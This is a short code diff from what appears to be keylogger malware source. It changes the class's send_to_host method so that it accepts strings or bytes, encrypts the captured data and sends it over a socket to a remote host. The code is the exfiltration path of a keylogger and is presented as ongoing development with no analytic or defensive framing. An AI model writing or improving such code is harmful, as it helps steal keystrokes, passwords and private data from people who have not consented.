@@ -128,8 +128,10 @@ class Keylogger:
             except socket.error as e:
                 print(e)
 
-    def send_to_host(self, data):
-        encrypted_data = utils.encrypt(str.encode(data))
+    def send_to_host(self, data: str | bytes):
+        if type(data) == str:
+            data = data.encode("utf-8")
+        encrypted_data = utils.encrypt(data)
 
         try:
             self.sock.sendall(encrypted_data)
